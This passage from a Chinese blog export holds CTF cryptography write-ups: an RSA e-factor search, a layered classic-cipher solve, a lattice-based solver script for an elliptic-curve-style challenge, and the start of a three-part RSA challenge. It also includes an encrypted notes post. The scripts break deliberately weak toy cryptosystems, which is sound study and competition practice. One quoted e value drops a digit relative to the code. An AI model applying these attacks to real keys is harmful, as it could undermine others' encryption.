<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">e=[<span class="number">3</span>,<span class="number">47</span>,<span class="number">97</span>,<span class="number">157</span>,<span class="number">1601</span>,<span class="number">21851</span>,<span class="number">56277292709098311733</span>]</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">7</span>):</span><br><span class="line">	<span class="keyword">if</span> tmp // e[i] == inverse(e[i],phi):</span><br><span class="line">		<span class="built_in">print</span>(<span class="string">'e='</span>,e[i])</span><br><span class="line"><span class="comment">#因子为：56277292709098311733</span></span><br></pre></td></tr></table></figure>
<p>判断完因子后，使其互乘得到所有可能的e。代码来源于Wankko Ree大佬，用的算法类似于DFS。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">a=[<span class="number">3</span>,<span class="number">47</span>,<span class="number">97</span>,<span class="number">157</span>,<span class="number">1601</span>,<span class="number">21851</span>]</span><br><span class="line">b = <span class="built_in">set</span>()</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">go</span>(<span class="params">p, t</span>):</span></span><br><span class="line">    b.add(t)</span><br><span class="line">    <span class="keyword">if</span> p == <span class="built_in">len</span>(a):</span><br><span class="line">        <span class="keyword">return</span></span><br><span class="line">    go(p+<span class="number">1</span>, t*a[p])</span><br><span class="line">    go(p+<span class="number">1</span>, t)</span><br><span class="line"></span><br><span class="line">go(<span class="number">0</span>, <span class="number">1</span>)</span><br><span class="line">c = <span class="built_in">list</span>(b)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(b)):</span><br><span class="line">	c[i]*=<span class="number">56277292709098311733</span></span><br><span class="line"><span class="built_in">print</span>(c)</span><br></pre></td></tr></table></figure>
<p>解出来后，需要爆破所有可能的e，总数量为</p>
<script type="math/tex; mode=display">
C_{6}^{0}+C_{6}^{1}+C_{6}^{2}+C_{6}^{3}+C_{6}^{4}+C_{6}^{5}+C_{6}^{6}=64</script><p>应该是很好理解的，然后pq的值不确定，同样需要爆破。由于需要用到pwn的remote模块，而我完全不会。同时靶机也在第二天关闭，未能完整复现。根据已有WP，e的值应该是<code>5627729270909831173 * 3 * 21851</code>，然后根据题目要求sign：<code>pow(m,d,p)</code>签名。</p>
<p>后半部分LCG未能复现。</p>
<h3 id="参考链接：-2"><a href="#参考链接：-2" class="headerlink" title="参考链接："></a>参考链接：</h3><p>WP参考VN战队wp，中间的递归求e来自于Wankko Ree大佬。</p>
]]></content>
      <tags>
        <tag>比赛复现</tag>
      </tags>
  </entry>
  <entry>
    <title>高数学习笔记1 第一章 极限与连续</title>
    <url>/2021/05/22/%E9%AB%98%E6%95%B0%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B01-%E7%AC%AC%E4%B8%80%E7%AB%A0-%E6%9E%81%E9%99%90%E4%B8%8E%E8%BF%9E%E7%BB%AD/</url>
    <content><![CDATA[<div class="hbe hbe-container" id="hexo-blog-encrypt" data-wpm="抱歉, 密码不对呢，为什么不去社工管理员呢？" data-whm="OOPS, these decrypted content may changed, but you can still have a look.">
  <script id="hbeData" type="hbeData" data-hmacdigest="7a95cd575697c61acb28b894430ae46be5837e79e65c3cd5bb8690ec12c114e5">da8d53aaa19bbdad5d86e33d4a12bdd6c03b3bc8d0e87b6fefb0fd7748994bb16e3a6c084efdf182bad542e1e910ae1396160552189a596756a1ea79b06cffcbc2266360b13c6a1d3617bf91999afcec8863e7df8dd44ba2b9a057cd8a5e9259e0dd9af49856847b71b18809411a775867e8b2a1426d9e812076854a154c9d727ecd88199baedc909eea08ca313c95475cf1c444a1bf3fa6406ad44aa714d4c16576697e36adc334cb2606ab7e10ec09555021fd0ac13d535df31932b96a7f9b7b9eede08a8b035b6bc70d2150c9e056a9d93177c8734d5c0111dfc5165481547d08cf1b5cdbb624545b51cb07989b2aec8ff07f906952d960860d4fdd88e16490ecef1f32c99ef2da3e6b647eaab85f0843f43df3b3732fd647505e24e37f431fa9ee80f55596c91cd6d9c26f2a461bc96e8c70c13469a756b0a6f718152715e825aed74965d0d293cc3f65ec9a5ab6546f8b04ed4835afea6b155ccc6ef9611d8eaefbfa9ef3e399bddd81e412b7f6bf5a19ce07ac8f51e0e33111ee73563196786c2d7cc8781964228ded5c1c494ff2a3b47b8ee8cd6fe89461ecd5fb437b4b6ce38ad2779e51827c4149597c7250b0bed21d0fb2a423aa2da02b1931d4d6d271b75d1b97dc34fcf400eadab551d8b1428aebd94401116d1fb5ab08eba08ad534555d916a1d67f7e6c39ebf745f46421cd673b4ed3ed0ac94fae7946429e996501fcde17aa83a1429f0c47654e8c1cf7ae52099366b54c24c75ec4788795d1b6fb28648441dc52eea38c26abd3c7b47bdc430624480b1ffe66fa80918c7739a9b3291c1e00e4c0f4b238e0dfda5714a9e406afb177f0326ddc30cfadaf25fddeefad8bbba4e22675b9abfe980c5c1f6d21f0b78cb3cf6fa9c6eb9cae02a8bbb64d378ccd4e59d3c53ad4b45c251333f9d3cbd17ae21fa5ecf206fa378753b373edc6ef30caf195af555f1106b8b5d1f1d161e63abd7e545831fa399c437cb24d178122d967c02544ce47853cbbb3ff44d21a1cfc9b7154139720a95c2d3fdadfe09d8c59e81b2bb0ea6634049cfad5f2042c1a4463a4bba22eb1b1af3d984b72fb31ee904b0fdc253bad11c6ee3f25a9d3ec26701f121ca874372db8692ca4c4c5aaaba0623e2e7ba1b214073cba2e04051afe679dab7a3aba4601427f7e30e1d734384aaa621f2b48ae615702547aa04de3a5eaec15f4f2909319f8702af8c7fa38c21b66bedb649f9055b21ca4218b5b6b2a618c1ce17d7e5c38ff1fdff45b1cb1b0399c66f68b685cefd2639e028b624aad308dbbf6fe9422f50f8162a87594e6d5523134e9aa64eddda68359a16283908f689d356179525ba500c5c5dced011d5a3b62187957597e171178c94430177e0ef8888d10a774d21675b8246e64900124dadf6574837fe750e0583915f14c81096cc6ce51ceb29f07814a8dbf6f8335e2422834f2356b418649427d616e45531c5a221bbc176cf785ff65c96f1e122e682f23c669131d73cf78e5ec78139d2a4e7dd353b26a829d63a3105e4fd09f0e873d46ca8b8ca7c38c4778ccd26e6ef25bf0443edea3be982d26e2d25b5e9b5db0667d5f9002a2fa998d9bd60be3be114e390438f81c391fedcee29ed5b2b9bf5e7ddd451e9d3dbbec38e60691783dd9cd1702b23c428ee5c07c6962f3e9a507caf86d043dbddbf8f7caf53c26e027cd96bf18a415eb32f54ead6441e9e97024bcf7a32c23684e66210ac77161780a3ab0d88bd33a96c1b89a1576c1c64fac4c50a92aa67234255aab0f48cf7baf90516e0df8730337ea59cab15a00997e0f454ce5d277d4c2d44fc119f3a7a684be8c02b64879e1f257f56b903032337f67902095931e989a9234400039ea02629dff927761a0671d16281a9cf337ae457466aa1132dcea4852e47b841307a0a3eff0774b7159754d6e1dc9becc5ab2f73b4f26cae03f4648318841ac47b3b018264c224892362ad152971dc329335ee1454fd8f3cc836e7bd0035fafeddd432285f082f3cc4878dfd891dcb90bd4b59a41349b26370ed578fe5a9a9d498e7</script>
  <div class="hbe hbe-content">
    <div class="hbe hbe-input hbe-input-default">
      <input class="hbe hbe-input-field hbe-input-field-default" type="password" id="hbePass">
      <label class="hbe hbe-input-label hbe-input-label-default" for="hbePass">
        <span class="hbe hbe-input-label-content hbe-input-label-content-default">您好,接下来的内容需要密码才能阅览。</span>
      </label>
    </div>
  </div>
</div>
<script data-pjax src="/lib/hbe.js"></script><link href="/css/hbe.style.css" rel="stylesheet" type="text/css">]]></content>
      <categories>
        <category>基础课程学习</category>
      </categories>
      <tags>
        <tag>高数</tag>
      </tags>
  </entry>
  <entry>
    <title>国赛密码部分wp</title>
    <url>/2021/05/19/%E5%9B%BD%E8%B5%9B%E5%AF%86%E7%A0%81%E9%83%A8%E5%88%86wp/</url>
    <content><![CDATA[<h1 id="国赛密码部分wp"><a href="#国赛密码部分wp" class="headerlink" title="国赛密码部分wp"></a>国赛密码部分wp</h1><p>这次国赛只做出两道密码，很丢人，便在赛后将能力范围内的赛题简单复现一下。</p>
<span id="more"></span>
<h2 id="一卷：classic"><a href="#一卷：classic" class="headerlink" title="一卷：classic"></a>一卷：classic</h2><h3 id="题目："><a href="#题目：" class="headerlink" title="题目："></a>题目：</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">AXAXDFDXXAFADFGFXAADFGDXGFDXFFDFAXDXFFFFXGXGAAXAGAFDDXFFDXFFDXDXDXDXGFDFAXFXAADXAAGAXGDGXAXAFAXXFFXADFFGAADXDXAXDFDFDXXAXXDXDAAAAAFAXAAAFGGAFGFGXADXXADFGADXDFDFGAGFDGAXFGAXDGDADXFFFFDAGFADXGDX</span><br></pre></td></tr></table></figure>
<h3 id="解答："><a href="#解答：" class="headerlink" title="解答："></a>解答：</h3><p>很明显的ADFGX加密，且不给密钥和关键字，也没有hint。<del>显然，出题人希望密码手们能在8小时内自主研发出量子计算机来攻克这题。</del></p>
<p>复现过程：</p>
<p>使用以下网址</p>
<p><img src="https://i.loli.net/2021/05/19/b2tc7NLp6P3kArV.png" alt="image-20210519130756056"></p>
<p>密钥使用以下公开密码表：PHQGMEAYNOFDXKRCVSZWBUTIL</p>
<p>关键字key清空，就能得到一串啥都看不懂的东西：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">MMYOBFYSBHKOSOXYMOXXIIPBCDOXOXOOOOSYMRPOPCINBBFLXBYKPOOMYYOBLOEPPFBPKCKKBOBYCOYYCSNMKMNEOXXESHIO</span><br></pre></td></tr></table></figure>
<p>没想到吧，然后要进行栅栏密码</p>
<p><img src="https://i.loli.net/2021/05/19/Wr65z1qeCSlGFN2.png" alt="image-20210519131121813"></p>
<p>然后还要凯撒</p>
<p><img src="https://i.loli.net/2021/05/19/zf6Dd18SR4glJQx.png" alt="image-20210519131157761"></p>
<p>终于发现了有一段CISCN字样。将里面的英语翻译一下，即可得到flag</p>
<h3 id="本题总结："><a href="#本题总结：" class="headerlink" title="本题总结："></a>本题总结：</h3><p>比赛时完全没有做出来，时间都花在爆破密钥、猜关键字、<del>寻觅量子计算机和祈祷图灵转世上了</del>。</p>
<h3 id="参考资料："><a href="#参考资料：" class="headerlink" title="参考资料："></a>参考资料：</h3><p><a href="https://blog.csdn.net/weixin_43540515/article/details/113122845">1.4 ADFGX原理</a></p>
<p>睡不醒的某某车赛后wp</p>
<h2 id="二卷：move"><a href="#二卷：move" class="headerlink" title="二卷：move"></a>二卷：move</h2><h3 id="题目：-1"><a href="#题目：-1" class="headerlink" title="题目："></a>题目：</h3><p>output.txt:</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">n = <span class="number">80263253261445006152401958351371889864136455346002795891511487600252909606767728751977033280031100015044527491214958035106007038983560835618126173948587479951247946411421106848023637323702085026892674032294882180449860010755423988302942811352582243198025232225481839705626921264432951916313817802968185697281</span></span><br><span class="line">e = <span class="number">67595664083683668964629173652731210158790440033379175857028564313854014366016864587830963691802591775486321717360190604997584315420339351524880699113147436604350832401671422613906522464334532396034178284918058690365507263856479304019153987101884697932619200538492228093521576834081916538860988787322736613809</span></span><br><span class="line">h1 = <span class="number">3518005</span></span><br><span class="line">h2 = <span class="number">641975</span></span><br><span class="line">c = (<span class="number">6785035174838834841914183175930647480879288136014127270387869708755060512201304812721289604897359441373759673837533885681257952731178067761309151636485456082277426056629351492198510336245951408977207910307892423796711701271285060489337800033465030600312615976587155922834617686938658973507383512257481837605</span>, <span class="number">38233052047321946362283579951524857528047793820071079629483638995357740390030253046483152584725740787856777849310333417930989050087087487329435299064039690255526263003473139694460808679743076963542716855777569123353687450350073011620347635639646034793626760244748027610309830233139635078417444771674354527028</span>)</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>task.py</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> math <span class="keyword">import</span> sqrt, gcd</span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line"></span><br><span class="line">BITS = <span class="number">512</span></span><br><span class="line">f = <span class="built_in">open</span>(<span class="string">&quot;flag.txt&quot;</span>, <span class="string">&quot;rb&quot;</span>)</span><br><span class="line">flag = f.read()</span><br><span class="line">f.close()</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_prime</span>(<span class="params">nbit</span>):</span></span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        p = getPrime(nbit)</span><br><span class="line">        <span class="keyword">if</span> p % <span class="number">3</span> == <span class="number">2</span>:</span><br><span class="line">            <span class="keyword">return</span> p</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">gen</span>(<span class="params">nbit</span>):</span></span><br><span class="line">    p = get_prime(nbit)</span><br><span class="line">    q = get_prime(nbit)</span><br><span class="line">    <span class="keyword">if</span> q &gt; p:</span><br><span class="line">        p, q = q, p</span><br><span class="line">    n = p * q</span><br><span class="line">    bound = <span class="built_in">int</span>(sqrt(<span class="number">2</span> * n)) // <span class="number">12</span></span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        x = random.randint(<span class="number">1</span>, <span class="built_in">round</span>(sqrt(bound)))</span><br><span class="line">        y = random.randint(<span class="number">1</span>, bound) // x</span><br><span class="line">        zbound = <span class="built_in">int</span>(((p - q) * <span class="built_in">round</span>(n ** <span class="number">0.25</span>) * y) // (<span class="number">3</span> * (p + q)))</span><br><span class="line">        z = zbound - ((p + <span class="number">1</span>) * (q + <span class="number">1</span>) * y + zbound) % x</span><br><span class="line">        e = ((p + <span class="number">1</span>) * (q + <span class="number">1</span>) * y + z) // x</span><br><span class="line">        <span class="keyword">if</span> gcd(e, (p + <span class="number">1</span>) * (q + <span class="number">1</span>)) == <span class="number">1</span>:</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">    gifts = [<span class="built_in">int</span>(<span class="built_in">bin</span>(p)[<span class="number">2</span>:][:<span class="number">22</span>], <span class="number">2</span>), <span class="built_in">int</span>(<span class="built_in">bin</span>(p)[<span class="number">2</span>:][<span class="number">256</span>:<span class="number">276</span>], <span class="number">2</span>)]</span><br><span class="line">    <span class="keyword">return</span> n, e, gifts</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span>(<span class="params">p1, p2</span>):</span></span><br><span class="line">    <span class="keyword">if</span> p1 == (<span class="number">0</span>, <span class="number">0</span>):</span><br><span class="line">        <span class="keyword">return</span> p2</span><br><span class="line">    <span class="keyword">if</span> p2 == (<span class="number">0</span>, <span class="number">0</span>):</span><br><span class="line">        <span class="keyword">return</span> p1</span><br><span class="line">    <span class="keyword">if</span> p1[<span class="number">0</span>] == p2[<span class="number">0</span>] <span class="keyword">and</span> (p1[<span class="number">1</span>] != p2[<span class="number">1</span>] <span class="keyword">or</span> p1[<span class="number">1</span>] == <span class="number">0</span>):</span><br><span class="line">        <span class="keyword">return</span> (<span class="number">0</span>, <span class="number">0</span>)</span><br><span class="line">    <span class="keyword">if</span> p1[<span class="number">0</span>] == p2[<span class="number">0</span>]:</span><br><span class="line">        tmp = (<span class="number">3</span> * p1[<span class="number">0</span>] * p1[<span class="number">0</span>]) * inverse(<span class="number">2</span> * p1[<span class="number">1</span>], n) % n</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        tmp = (p2[<span class="number">1</span>] - p1[<span class="number">1</span>]) * inverse(p2[<span class="number">0</span>] - p1[<span class="number">0</span>], n) % n</span><br><span class="line">    x = (tmp * tmp - p1[<span class="number">0</span>] - p2[<span class="number">0</span>]) % n</span><br><span class="line">    y = (tmp * (p1[<span class="number">0</span>] - x) - p1[<span class="number">1</span>]) % n</span><br><span class="line">    <span class="keyword">return</span> (<span class="built_in">int</span>(x), <span class="built_in">int</span>(y))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">mul</span>(<span class="params">n, p</span>):</span></span><br><span class="line">    r = (<span class="number">0</span>, <span class="number">0</span>)</span><br><span class="line">    tmp = p</span><br><span class="line">    <span class="keyword">while</span> <span class="number">0</span> &lt; n:</span><br><span class="line">        <span class="keyword">if</span> n &amp; <span class="number">1</span> == <span class="number">1</span>:</span><br><span class="line">            r = add(r, tmp)</span><br><span class="line">        n, tmp = n &gt;&gt; <span class="number">1</span>, add(tmp, tmp)</span><br><span class="line">    <span class="keyword">return</span> r</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">n, e, hint = gen(BITS)</span><br><span class="line">pt = (bytes_to_long(flag[:<span class="built_in">len</span>(flag) // <span class="number">2</span>]), bytes_to_long(flag[<span class="built_in">len</span>(flag) // <span class="number">2</span>:]))</span><br><span class="line">c = mul(e, pt)</span><br><span class="line">f = <span class="built_in">open</span>(<span class="string">&quot;output.txt&quot;</span>, <span class="string">&quot;w&quot;</span>)</span><br><span class="line">f.write(<span class="string">f&quot;n = <span class="subst">&#123;n&#125;</span>\n&quot;</span>)</span><br><span class="line">f.write(<span class="string">f&quot;e = <span class="subst">&#123;e&#125;</span>\n&quot;</span>)</span><br><span class="line">f.write(<span class="string">f&quot;h1 = <span class="subst">&#123;hint[<span class="number">0</span>]&#125;</span>\n&quot;</span>)</span><br><span class="line">f.write(<span class="string">f&quot;h2 = <span class="subst">&#123;hint[<span class="number">1</span>]&#125;</span>\n&quot;</span>)</span><br><span class="line">f.write(<span class="string">f&quot;c = <span class="subst">&#123;c&#125;</span>\n&quot;</span>)</span><br><span class="line">f.close()</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<h3 id="解答：-1"><a href="#解答：-1" class="headerlink" title="解答："></a>解答：</h3><p>虎符2021 simultaneous原题简化版</p>
<p>直接上exp：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> inverse, long_to_bytes</span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span>(<span class="params">p1, p2</span>):</span></span><br><span class="line">    <span class="keyword">if</span> p1 == (<span class="number">0</span>, <span class="number">0</span>):</span><br><span class="line">        <span class="keyword">return</span> p2</span><br><span class="line">    <span class="keyword">if</span> p2 == (<span class="number">0</span>, <span class="number">0</span>):</span><br><span class="line">        <span class="keyword">return</span> p1</span><br><span class="line">    <span class="keyword">if</span> p1[<span class="number">0</span>] == p2[<span class="number">0</span>] <span class="keyword">and</span> (p1[<span class="number">1</span>] != p2[<span class="number">1</span>] <span class="keyword">or</span> p1[<span class="number">1</span>] == <span class="number">0</span>):</span><br><span class="line">        <span class="keyword">return</span> (<span class="number">0</span>, <span class="number">0</span>)</span><br><span class="line">    <span class="keyword">if</span> p1[<span class="number">0</span>] == p2[<span class="number">0</span>]:</span><br><span class="line">        tmp = (<span class="number">3</span> * p1[<span class="number">0</span>] * p1[<span class="number">0</span>]) * inverse(<span class="number">2</span> * p1[<span class="number">1</span>], n) % n</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        tmp = (p2[<span class="number">1</span>] - p1[<span class="number">1</span>]) * inverse(p2[<span class="number">0</span>] - p1[<span class="number">0</span>], n) % n</span><br><span class="line">    x = (tmp * tmp - p1[<span class="number">0</span>] - p2[<span class="number">0</span>]) % n</span><br><span class="line">    y = (tmp * (p1[<span class="number">0</span>] - x) - p1[<span class="number">1</span>]) % n</span><br><span class="line">    <span class="keyword">return</span> (<span class="built_in">int</span>(x), <span class="built_in">int</span>(y))</span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">mul</span>(<span class="params">n, p</span>):</span></span><br><span class="line">    r = (<span class="number">0</span>, <span class="number">0</span>)</span><br><span class="line">    tmp = p</span><br><span class="line">    <span class="keyword">while</span> <span class="number">0</span> &lt; n:</span><br><span class="line">        <span class="keyword">if</span> n &amp; <span class="number">1</span> == <span class="number">1</span>:</span><br><span class="line">            r = add(r, tmp)</span><br><span class="line">        n, tmp = n &gt;&gt; <span class="number">1</span>, add(tmp, tmp)</span><br><span class="line">    <span class="keyword">return</span> r</span><br><span class="line"> </span><br><span class="line">n = <span class="number">80263253261445006152401958351371889864136455346002795891511487600252909606767728751977033280031100015044527491214958035106007038983560835618126173948587479951247946411421106848023637323702085026892674032294882180449860010755423988302942811352582243198025232225481839705626921264432951916313817802968185697281</span></span><br><span class="line">e = <span class="number">67595664083683668964629173652731210158790440033379175857028564313854014366016864587830963691802591775486321717360190604997584315420339351524880699113147436604350832401671422613906522464334532396034178284918058690365507263856479304019153987101884697932619200538492228093521576834081916538860988787322736613809</span></span><br><span class="line">c = (<span class="number">6785035174838834841914183175930647480879288136014127270387869708755060512201304812721289604897359441373759673837533885681257952731178067761309151636485456082277426056629351492198510336245951408977207910307892423796711701271285060489337800033465030600312615976587155922834617686938658973507383512257481837605</span>, <span class="number">38233052047321946362283579951524857528047793820071079629483638995357740390030253046483152584725740787856777849310333417930989050087087487329435299064039690255526263003473139694460808679743076963542716855777569123353687450350073011620347635639646034793626760244748027610309830233139635078417444771674354527028</span>)</span><br><span class="line"><span class="comment"># M = Matrix(ZZ, [[2**512, e],</span></span><br><span class="line"><span class="comment">#                 [0, -n]])</span></span><br><span class="line"><span class="comment"># GV = M.LLL()[0]</span></span><br><span class="line">GV = (-<span class="number">352349739892292322999330613117511489276791137416050590322561272098135764509812116210543232353192946492907441641899508311181782397967869533800138447935440769558784357373166666205853969428654899524304252899588626355058283586558885888</span>, -<span class="number">406850608655407486298019095013146348847805975120061760929682791882948049742096195978800022454159691659865169100330308708576847735609146508679126419372034710027124703842712262177437006326228856546452636094881051757653949488135598409</span>)</span><br><span class="line">x = -GV[<span class="number">0</span>] &gt;&gt; <span class="number">512</span></span><br><span class="line">y = (e*x+GV[<span class="number">1</span>])//n</span><br><span class="line">k = e*x-n*y</span><br><span class="line">K = k//y</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">factor</span>(<span class="params">K, N</span>):</span></span><br><span class="line">    l = <span class="number">0</span></span><br><span class="line">    r = K</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">518</span>):</span><br><span class="line">        s = (l+r)//<span class="number">2</span></span><br><span class="line">        v = s*s - (<span class="number">9</span>*s**<span class="number">2</span>*(K-<span class="number">1</span>-s)**<span class="number">2</span>//(<span class="built_in">round</span>(N**<span class="number">0.25</span>)**<span class="number">2</span>))</span><br><span class="line">        <span class="keyword">if</span> v &lt; <span class="number">4</span>*N:</span><br><span class="line">            l = s</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            r = s</span><br><span class="line">    <span class="keyword">return</span> r</span><br><span class="line">S = factor(K, n)</span><br><span class="line">d = inverse(e, n+<span class="number">1</span>+S)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">b&#x27;&#x27;</span>.join(long_to_bytes(i) <span class="keyword">for</span> i <span class="keyword">in</span> mul(d, c)))</span><br><span class="line"></span><br><span class="line"><span class="comment"># 商业转载请联系作者获得授权，非商业转载请注明出处。</span></span><br><span class="line"><span class="comment"># For commercial use, please contact the author for authorization. For non-commercial use, please indicate the source.</span></span><br><span class="line"><span class="comment"># 协议(License)：署名-非商业性使用-相同方式共享 4.0 国际 (CC BY-NC-SA 4.0)</span></span><br><span class="line"><span class="comment"># 作者(Author)：Wankko Ree</span></span><br><span class="line"><span class="comment"># 链接(URL)：https://www.wkr.moe/ctf/523.html</span></span><br><span class="line"><span class="comment"># 来源(Source)：Wankko Ree&#x27;s Blog</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>
<h3 id="本题总结：-1"><a href="#本题总结：-1" class="headerlink" title="本题总结："></a>本题总结：</h3><p>本题为虎符2021密码原题。<del>太卷了太卷了。</del>详细原理可以看</p>
<p>d33b4t0巨佬博客中对虎符原题的讲解。exp改编自他的解题脚本。其中注释部分除去讲解，均为sage运行。</p>
<h3 id="参考资料：-1"><a href="#参考资料：-1" class="headerlink" title="参考资料："></a>参考资料：</h3><p><a href="https://d33b4t0.com/2021/04/09/HFCTF%202021%20Crypto%20WP/">d33b4t0巨佬虎符CTF密码wp</a></p>
<p><a href="https://www.wkr.moe/ctf/523.html">Wankko Ree国赛wp</a></p>
<h2 id="三卷：rsa"><a href="#三卷：rsa" class="headerlink" title="三卷：rsa"></a>三卷：rsa</h2><h3 id="题目：-2"><a href="#题目：-2" class="headerlink" title="题目："></a>题目：</h3><p>out:</p>
<p>已整理进chall.py多行注释中。</p>
<p>chall.py</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> flag <span class="keyword">import</span> text,flag</span><br><span class="line"><span class="keyword">import</span> md5</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> long_to_bytes,bytes_to_long,getPrime</span><br><span class="line"></span><br><span class="line"><span class="keyword">assert</span> md5.new(text).hexdigest() == flag[<span class="number">6</span>:-<span class="number">1</span>]</span><br><span class="line"></span><br><span class="line">msg1 = text[:xx]</span><br><span class="line">msg2 = text[xx:yy]</span><br><span class="line">msg3 = text[yy:]</span><br><span class="line"></span><br><span class="line">msg1 = bytes_to_long(msg1)</span><br><span class="line">msg2 = bytes_to_long(msg2)</span><br><span class="line">msg3 = bytes_to_long(msg3)</span><br><span class="line"></span><br><span class="line">p1 = getPrime(<span class="number">512</span>)</span><br><span class="line">q1 = getPrime(<span class="number">512</span>)</span><br><span class="line">N1 = p1*q1</span><br><span class="line">e1 = <span class="number">3</span></span><br><span class="line"><span class="built_in">print</span> <span class="built_in">pow</span>(msg1,e1,N1)</span><br><span class="line"><span class="built_in">print</span> (e1,N1)</span><br><span class="line"></span><br><span class="line">p2 = getPrime(<span class="number">512</span>)</span><br><span class="line">q2 = getPrime(<span class="number">512</span>)</span><br><span class="line">N2 = p2*q2</span><br><span class="line">e2 = <span class="number">17</span></span><br><span class="line">e3 = <span class="number">65537</span></span><br><span class="line"><span class="built_in">print</span> <span class="built_in">pow</span>(msg2,e2,N2)</span><br><span class="line"><span class="built_in">print</span> <span class="built_in">pow</span>(msg2,e3,N2)</span><br><span class="line"><span class="built_in">print</span> (e2,N2)</span><br><span class="line"><span class="built_in">print</span> (e3,N2)</span><br><span class="line"></span><br><span class="line">p3 = getPrime(<span class="number">512</span>)</span><br><span class="line">q3 = getPrime(<span class="number">512</span>)</span><br><span class="line">N3 = p3*q3</span><br><span class="line"><span class="built_in">print</span> <span class="built_in">pow</span>(msg3,e3,N3)</span><br><span class="line"><span class="built_in">print</span> (e3,N3)</span><br><span class="line"><span class="built_in">print</span> p3&gt;&gt;<span class="number">200</span></span><br><span class="line"></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">cmsg1_e1_n1 = 19105765285510667553313898813498220212421177527647187802549913914263968945493144633390670605116251064550364704789358830072133349108808799075021540479815182657667763617178044110939458834654922540704196330451979349353031578518479199454480458137984734402248011464467312753683234543319955893</span></span><br><span class="line"><span class="string">e1_n1 = (3, 123814470394550598363280518848914546938137731026777975885846733672494493975703069760053867471836249473290828799962586855892685902902050630018312939010564945676699712246249820341712155938398068732866646422826619477180434858148938235662092482058999079105450136181685141895955574548671667320167741641072330259009L)</span></span><br><span class="line"><span class="string">cmsg2_e2_n2 = 54995751387258798791895413216172284653407054079765769704170763023830130981480272943338445245689293729308200574217959018462512790523622252479258419498858307898118907076773470253533344877959508766285730509067829684427375759345623701605997067135659404296663877453758701010726561824951602615501078818914410959610</span></span><br><span class="line"><span class="string">cmsg2_e3_n2 = 91290935267458356541959327381220067466104890455391103989639822855753797805354139741959957951983943146108552762756444475545250343766798220348240377590112854890482375744876016191773471853704014735936608436210153669829454288199838827646402742554134017280213707222338496271289894681312606239512924842845268366950</span></span><br><span class="line"><span class="string">e2_n2 = (17, 111381961169589927896512557754289420474877632607334685306667977794938824018345795836303161492076539375959731633270626091498843936401996648820451019811592594528673182109109991384472979198906744569181673282663323892346854520052840694924830064546269187849702880332522636682366270177489467478933966884097824069977L)</span></span><br><span class="line"><span class="string">e3_n2 = (65537, 111381961169589927896512557754289420474877632607334685306667977794938824018345795836303161492076539375959731633270626091498843936401996648820451019811592594528673182109109991384472979198906744569181673282663323892346854520052840694924830064546269187849702880332522636682366270177489467478933966884097824069977L)</span></span><br><span class="line"><span class="string">cmsg3_e3_n3 = 59213696442373765895948702611659756779813897653022080905635545636905434038306468935283962686059037461940227618715695875589055593696352594630107082714757036815875497138523738695066811985036315624927897081153190329636864005133757096991035607918106529151451834369442313673849563635248465014289409374291381429646</span></span><br><span class="line"><span class="string">e3_n3 = (65537, 113432930155033263769270712825121761080813952100666693606866355917116416984149165507231925180593860836255402950358327422447359200689537217528547623691586008952619063846801829802637448874451228957635707553980210685985215887107300416969549087293746310593988908287181025770739538992559714587375763131132963783147L)</span></span><br><span class="line"><span class="string">高位p3 = 7117286695925472918001071846973900342640107770214858928188419765628151478620236042882657992902</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br></pre></td></tr></table></figure>
<h3 id="解答：-2"><a href="#解答：-2" class="headerlink" title="解答："></a>解答：</h3><p>送分题，都是很常见的rsa套路。</p>
<p>从题目可以看出，flag为text的md5值得到。然后text被拆成了3段，需要分别解出message1,message2,message3，拼接成text。</p>
<p>第一段是小加密指数爆破</p>
